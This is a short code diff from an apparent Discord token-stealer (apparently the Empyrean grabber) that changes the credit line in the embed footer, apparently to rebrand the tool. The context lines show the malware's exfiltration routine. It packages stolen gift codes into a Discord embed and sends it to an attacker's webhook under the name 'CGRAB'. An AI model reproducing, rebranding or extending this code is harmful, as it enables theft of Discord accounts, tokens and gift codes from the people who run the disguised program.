@@ -367,6 +367,6 @@ class upload_tokens:
                 embed.add_field(name="<a:gift:1021608479808569435> Gift Codes:", value=codes, inline=False)
                 embed.add_field(name="\u200b", value="\u200b", inline=False)
 
-            embed.set_footer(text="github.com/addi00000/empyrean")
+            embed.set_footer(text="blu OWNS AND ALL")
 
             self.webhook.send(embed=embed, username="CGRAB", avatar_url="https://cdn.discordapp.com/attachments/1049343091116609637/1071442007798579271/a_43251a8d72d23c27de799da39daab7bc.gif")
